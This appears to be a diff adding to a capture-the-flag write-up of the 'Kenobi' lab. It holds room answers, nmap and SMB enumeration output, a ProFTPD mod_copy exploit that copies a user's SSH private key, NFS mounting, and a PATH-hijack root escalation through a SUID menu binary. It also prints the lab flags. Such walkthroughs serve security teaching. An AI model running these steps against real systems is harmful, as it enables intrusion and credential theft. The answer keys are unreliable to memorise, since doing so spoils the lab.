@@ -1,5 +1,7 @@
 # Kenobi
 
+Scan the machine with nmap, how many ports are open? 7
+
 ```
 nmap -sC -sV 10.10.162.24         
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 12:37 CDT
@@ -72,6 +74,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 34.70 seconds
 ```
 
+Using the nmap command above, how many shares have been found? 3
+
+What port is FTP running on? 21
+
+
+
 ```
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.162.24
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 12:47 CDT
@@ -111,6 +119,8 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 20.08 seconds
 ```
+
+Once you're connected, list the files on the share. What is the file can you see? log.txt
 
 ```
 smbclient //10.10.162.24/anonymous
@@ -161,6 +171,8 @@ The key's randomart image is:
 # "nobody" and "ftp" for normal operation and anon.
 ```
 
+What mount can we see? /var
+
 ```
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.162.24
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 12:59 CDT
@@ -174,6 +186,10 @@ PORT    STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 1.57 seconds
 ```
+What is the version? 1.3.5
+
+How many exploits are there for the ProFTPd running? 3
+
 
 ```
 searchsploit ProFTPD 1.3.5            
@@ -188,7 +204,47 @@ Shellcodes: No Results
 ```
 
 ```
-ssh -i id_rsa kenobi@10.10.162.24     
+nc 10.10.162.24 21
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.162.24]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+```
+
+```
+sudo mount 10.10.212.24:/var /mnt/kenobiNFS
+
+ls -al /mnt/kenobiNFS/tmp
+total 28
+drwxrwxrwt  6 root   root   4096 Apr 19  2021 .
+drwxr-xr-x 14 root   root   4096 Sep  4  2019 ..
+-rw-r--r--  1 reggie reggie 1675 Apr 19  2021 id_rsa
+drwx------  3 root   root   4096 Apr 19 08:48 systemd-private-19d6986b3f3c4f25aa9ac8cd3892871b-systemd-timesyncd.service-LrtYyh
+drwx------  3 root   root   4096 Sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
+drwx------  3 root   root   4096 Sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
+drwx------  3 root   root   4096 Sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
+```
+
+```
+ssh -i id_rsapurge kenobi@10.10.212.38                                                                                                             3 ⚙
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'id_rsapurge' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsapurge": bad permissions
+kenobi@10.10.212.38's password:
+
+
+chmod 600 id_rsapurge
+```
+
+
+
+```
+ssh -i id_rsapurge kenobi@10.10.162.24     
 The authenticity of host '10.10.162.24 (10.10.162.24)' can't be established.
 ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -206,6 +262,78 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
 Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
 To run a command as administrator (user "root"), use "sudo <command>".
 See "man sudo_root" for details.
+
+kenobi@kenobi:~$ cat user.txt
+d0b0f3f53b6caa532a83915e19224899
+
+kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+
+/usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+HTTP/1.1 200 OK
+Date: Mon, 19 Apr 2021 14:49:42 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
+ETag: "c8-591b6884b6ed2"
+Accept-Ranges: bytes
+Content-Length: 200
+Vary: Accept-Encoding
+Content-Type: text/html
+
+kenobi@kenobi:~$ echo $PATH
+/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+kenobi@kenobi:~$ which curl
+/usr/bin/curl
+
+kenobi@kenobi:~$ cd /tmp/
+kenobi@kenobi:~$ echo /bin/sh > curl
+kenobi@kenobi:~$ chmod +x curl
+kenobi@kenobi:~$ export PATH=/home/kenobi:$PATH
+kenobi@kenobi:~$ echo $PATH
+/home/kenobi:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# whoami
+root
+# cd /root/
+# ls
+root.txt
+# cat root.txt
+177b3cd8562289f3----------381f02
 ```  
 
 Happy Ethical Hacking
